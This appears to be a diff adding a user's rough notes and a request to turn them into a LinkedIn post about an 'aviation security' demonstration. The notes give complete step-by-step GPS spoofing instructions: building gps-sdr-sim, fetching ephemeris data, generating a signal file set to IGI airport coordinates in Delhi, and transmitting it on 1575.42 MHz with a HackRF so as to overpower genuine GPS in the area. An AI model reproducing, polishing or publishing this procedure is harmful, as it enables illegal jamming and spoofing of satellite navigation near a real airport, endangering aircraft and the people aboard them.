@@ -1,0 +1,46 @@
+i am making for gps spoofing project ;aviation security
+it is demostartion of the cireent gps spoofing attacks on plane at igi airport in delhi 
+so its of aviation security
+coorect the English and details wherevrr required and make a linkeidn post
+
+1. we will be using dragon os for this
+2. git clone https://github.com/osqzss/gps-sdr-sim.git
+3. Building with GCC - compile the c ifle "gcc gpssim.c -lm -O3 -o gps-sdr-sim"
+
+
+
+
+4. now we'll download the "ephemeris" file - nasa usually they record the broadcasr GPS satellite broadcast this file is known as the ephemeris file , th e extension is brdc  
+to download go to - https://urs.earthdata.nasa.gov/login
+make an account , login and go to 
+https://cddis.nasa.gov/archive/gnss/data/daily/
+download the latest brdc file 
+for me i downloaded 
+[file]
+brdc3190.25n.gz 2025:11:15 09:26:05    24.16KB
+5. unzip it by gzip - d brdc3190.25n.gz
+
+
+
+6. so since im using hackrf , ill do HackRF:
+The output data have to be 8-bit signed I/Q samples.
+"./gps-sdr-sim -e brdc3190.25n -l 28.556276,77.100662,100 -b 8"
+the -l parameter here is latitude , longitude and height - ive stet these as the cooridnates o fthe igi airport
+this command will generate the gpssim.bin file , 
+this file will be later used by hackrf one as file reference for transmit 
+the duration is set to 300 second here
+so when the hackrf ttransmts it it will be tramistted for 5 minutes
+7. go to https://hackrf.app/ to updatethe mahyem firmware of hackrf
+8. You can use hackrf_transfer tool in the HackRF host software.
+
+> hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0
+
+this command will send the signals
+7. now well use a gps antenna to transmit the signals , which on 1575.42MHz 
+ it will overpower the signals coming from all other devices in that area and give the location corrodinated spopoffed which i have given it 
+
+
+ive attached detailed pdf report and step by step explanation : 
+support video part 1 : https://www.youtube.com/watch?v=n-icyyWVHTU
+support video part 2 : https://www.youtube.com/watch?v=9PNcuVGbrJI
+https://drive.google.com/file/d/1sEKfoykWFWI7n-3t2ilsp9Uyt0q1x3NL/view?usp=sharing
